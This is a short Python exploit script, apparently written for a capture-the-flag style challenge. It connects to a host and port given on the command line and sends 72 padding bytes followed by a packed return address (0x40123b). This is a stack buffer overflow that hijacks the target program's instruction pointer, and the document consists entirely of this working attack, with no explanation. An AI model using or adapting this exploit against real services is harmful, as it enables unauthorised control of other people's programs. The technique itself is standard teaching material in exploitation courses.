#!/usr/bin/env python3

import socket
import argparse
import struct

parser = argparse.ArgumentParser()
parser.add_argument(
    "host",
    type=str,
    help="The host/IP to connect to",
)
parser.add_argument(
    "port",
    type=int,
    help="The port to connect to",
)

args = parser.parse_args()
offset = 72
new_rip = struct.pack("<Q", 0x40123b)
payload = b"".join(
    [
       b"A" * offset,
       new_rip,
    ]    
)

payload += b"\n"

with socket.socket() as conn:
    conn.connect((args.host, args.port))
    print(conn.recv(4096).decode('utf-8'))
    conn.send(payload)
    print(conn.recv(4096).decode('utf-8'))
    print(conn.recv(4096).decode('utf-8'))
